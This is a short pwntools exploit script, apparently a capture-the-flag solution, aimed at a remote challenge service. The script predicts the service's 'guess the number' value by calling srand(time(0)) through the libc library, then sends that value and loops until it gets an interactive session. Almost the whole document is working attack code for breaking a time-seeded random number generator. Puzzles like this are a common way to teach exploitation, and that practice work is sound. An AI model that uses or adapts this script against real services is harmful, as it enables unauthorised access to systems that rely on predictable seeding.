'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

pseudorandom
randn = time(0)
srand(randn)    
'''

from pwn import *
from ctypes import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "25064" 
filename = "./pwn"
elf = ELF(filename)
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

def B(io):
    gdb.attach(io)
    pause()

def pwn():
    if local:
        context.log_level = "debug"
        io = process(filename)
        context.terminal = ['tmux', 'splitw', '-h']
        # gdb.attach(io)
    else:
        io = remote(url, port)
        pass

    seed=libc.time(0)
    libc.srand(seed)
    random_num = libc.rand()

    payload = str(random_num)
    io.sendlineafter(b"can you guess the number?\n", payload)
    return io


if __name__ == "__main__":
    while (True):
        io = pwn()
        if b'not found' in io.recv(timeout=2):
            continue
        io.interactive()
    